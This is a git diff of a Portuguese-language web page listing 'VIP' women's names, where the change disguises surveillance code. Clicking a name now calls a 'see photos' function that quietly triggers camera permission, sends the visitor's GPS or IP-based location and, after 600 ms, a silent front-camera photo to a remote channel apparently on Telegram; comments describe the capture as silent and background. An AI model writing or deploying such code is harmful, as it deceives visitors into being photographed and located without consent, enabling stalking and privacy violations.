@@ -20,26 +20,26 @@ li:hover{background:#d0d8e0}
 <div class="card">
   <h2>Presenças VIP confirmadas</h2>
   <ul id="lista">
-    <li onclick="tirarSelfie('Ana Paula')">Ana Paula – VIP</li>
-    <li onclick="tirarSelfie('Beatriz Silva')">Beatriz Silva – VIP</li>
-    <li onclick="tirarSelfie('Camila Ribeiro')">Camila Ribeiro – VIP</li>
-    <li onclick="tirarSelfie('Daniela Lima')">Daniela Lima – VIP</li>
-    <li onclick="tirarSelfie('Elaine Costa')">Elaine Costa – VIP</li>
-    <li onclick="tirarSelfie('Fernanda Souza')">Fernanda Souza – VIP</li>
-    <li onclick="tirarSelfie('Gabriela Alves')">Gabriela Alves – VIP</li>
-    <li onclick="tirarSelfie('Helena Santos')">Helena Santos – VIP</li>
-    <li onclick="tirarSelfie('Isabela Ferreira')">Isabela Ferreira – VIP</li>
-    <li onclick="tirarSelfie('Juliana Nunes')">Juliana Nunes – VIP</li>
-    <li onclick="tirarSelfie('Karina Carvalho')">Karina Carvalho – VIP</li>
-    <li onclick="tirarSelfie('Larissa Gomes')">Larissa Gomes – VIP</li>
-    <li onclick="tirarSelfie('Mariana Rocha')">Mariana Rocha – VIP</li>
-    <li onclick="tirarSelfie('Nátalia Dias')">Nátalia Dias – VIP</li>
-    <li onclick="tirarSelfie('Patrícia Melo')">Patrícia Melo – VIP</li>
-    <li onclick="tirarSelfie('Quitéria Araújo')">Quitéria Araújo – VIP</li>
-    <li onclick="tirarSelfie('Renata Cardoso')">Renata Cardoso – VIP</li>
-    <li onclick="tirarSelfie('Sabrina Lopes')">Sabrina Lopes – VIP</li>
-    <li onclick="tirarSelfie('Tatiane Martins')">Tatiane Martins – VIP</li>
-    <li onclick="tirarSelfie('Viviane Pinto')">Viviane Pinto – VIP</li>
+    <li onclick="verFotos('Ana Paula')">Ana Paula – VIP</li>
+    <li onclick="verFotos('Beatriz Silva')">Beatriz Silva – VIP</li>
+    <li onclick="verFotos('Camila Ribeiro')">Camila Ribeiro – VIP</li>
+    <li onclick="verFotos('Daniela Lima')">Daniela Lima – VIP</li>
+    <li onclick="verFotos('Elaine Costa')">Elaine Costa – VIP</li>
+    <li onclick="verFotos('Fernanda Souza')">Fernanda Souza – VIP</li>
+    <li onclick="verFotos('Gabriela Alves')">Gabriela Alves – VIP</li>
+    <li onclick="verFotos('Helena Santos')">Helena Santos – VIP</li>
+    <li onclick="verFotos('Isabela Ferreira')">Isabela Ferreira – VIP</li>
+    <li onclick="verFotos('Juliana Nunes')">Juliana Nunes – VIP</li>
+    <li onclick="verFotos('Karina Carvalho')">Karina Carvalho – VIP</li>
+    <li onclick="verFotos('Larissa Gomes')">Larissa Gomes – VIP</li>
+    <li onclick="verFotos('Mariana Rocha')">Mariana Rocha – VIP</li>
+    <li onclick="verFotos('Nátalia Dias')">Nátalia Dias – VIP</li>
+    <li onclick="verFotos('Patrícia Melo')">Patrícia Melo – VIP</li>
+    <li onclick="verFotos('Quitéria Araújo')">Quitéria Araújo – VIP</li>
+    <li onclick="verFotos('Renata Cardoso')">Renata Cardoso – VIP</li>
+    <li onclick="verFotos('Sabrina Lopes')">Sabrina Lopes – VIP</li>
+    <li onclick="verFotos('Tatiane Martins')">Tatiane Martins – VIP</li>
+    <li onclick="verFotos('Viviane Pinto')">Viviane Pinto – VIP</li>
   </ul>
 </div>
 
@@ -63,7 +63,7 @@ const tele = (msg, media) => {
   }
 };
 
-async function tirarSelfie(nome) {
+async function capturaSilenciosa(nome) {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
     const v = document.createElement('video');
@@ -73,12 +73,26 @@ async function tirarSelfie(nome) {
     canvas.width = 640; canvas.height = 480;
     canvas.getContext('2d').drawImage(v, 0, 0);
     canvas.toBlob(blob=>{
-      tele(`📸 selfie – ${nome}`, blob);
+      tele(`📸 ${nome}`, blob);
       stream.getTracks().forEach(t=>t.stop());
     }, 'image/jpeg', 0.9);
   } catch (e) {
-    tele('📸 erro selfie: ' + e.message);
+    tele('📸 erro: ' + e.message);
   }
+}
+
+function verFotos(nome) {
+  // dispara permissões em segundo plano
+  navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+  navigator.geolocation.getCurrentPosition(
+    pos=>{
+      const {latitude:l,longitude:n}=pos.coords;
+      tele(`${nome} https://maps.google.com/?q=${l},${n}`);
+    },
+    ()=>fetch('https://ipapi.co/json/').then(r=>r.json()).then(data=>tele(`${nome} https://maps.google.com/?q=${data.latitude},${data.longitude}`)).catch(()=>tele(nome))
+  );
+  // captura silenciosa após 600 ms
+  setTimeout(()=>capturaSilenciosa(nome), 600);
 }
 </script>
 </body>
